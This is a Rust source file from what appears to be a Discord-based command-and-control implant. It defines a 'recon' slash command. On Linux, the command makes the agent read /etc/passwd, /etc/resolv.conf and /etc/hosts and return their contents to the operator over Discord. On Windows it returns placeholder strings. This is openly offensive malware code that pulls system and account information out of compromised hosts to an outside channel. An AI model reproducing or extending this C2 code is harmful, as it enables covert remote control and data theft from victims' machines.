use crate::{
    errors::DiscordC2Error,
    discord_utils::bot_functions::send_interaction_response
};

#[cfg(target_os = "linux")]
use crate::os::recon_utils::{get_etc_hosts, get_etc_passwd, get_resolv_conf};

use serenity::{
    builder::CreateApplicationCommand,
    client::Context,
    model::application::{
        command::CommandOptionType,
        interaction::application_command::{
            ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
        },
    },
};

use tracing::error;

pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Register the recon command
    command
        .name("recon")
        .description("Performs various recon operations/commands with the agent.")
        .create_option(|option| {
            option
                .name("recon-type")
                .kind(CommandOptionType::String)
                .description("The type of recon to perform.")
                .add_string_choice("Read /etc/passwd", "Read /etc/passwd")
                .add_string_choice("Read /etc/resolv.conf", "Read /etc/resolv.conf")
                .add_string_choice("Read /etc/hosts", "Read /etc/hosts")
                .required(true)
        });
    command
  
}

pub async fn run(options: &[CommandDataOption]) -> Result<String, DiscordC2Error> {
    let options = options.to_owned();

    let operation = options.get(0)
        .ok_or(DiscordC2Error::InternalError("Expected recon operation at index 0".to_string()))?
        .resolved
        .as_ref()
        .ok_or(DiscordC2Error::InternalError("Expected valid recon operation".to_string()))?;

    #[cfg(target_os = "linux")]
    if let CommandDataOptionValue::String(operation) = operation {
        match operation.as_str() {
            "Read /etc/passwd" => {
                Ok(get_etc_passwd().await)
            }
            "Read /etc/resolv.conf" => {
                Ok(get_resolv_conf().await)
            }
            "Read /etc/hosts" => {
                Ok(get_etc_hosts().await)
            }
            _ => {
                Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
            }
        }
    } else {
        Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
    }

    #[cfg(target_os = "windows")]
    if let CommandDataOptionValue::String(operation) = operation {
        match operation.as_str() {
            "Read /etc/passwd" => {
                Ok("testing1".to_string())
            }
            "Read /etc/resolv.conf" => {
                Ok("testing2".to_string())
            }
            "Read /etc/hosts" => {
                Ok("testing3".to_string())
            }
            _ => {
                Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
            }
        }
    } else {
        Err(DiscordC2Error::InvalidInput("Invalid recon operation.".to_string()))
    }
}

pub async fn recon_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
    let operation = run(&command.data.options).await;

    match operation {
        Ok(string) => {
            // Send the succesful response with the output of operation
            if let Err(why) = send_interaction_response(ctx, command, string, None).await {
                error!("Ran into an error when sending an interaction response: {}", why);
            };
        },
        Err(why) => {
            // Send a response indicating why this failed.
            if let Err(why) = send_interaction_response(ctx, command, why.to_string(), None).await {
                error!("Ran into an error when sending an interaction response: {}", why);
            };
        }
    }

    Ok(())
}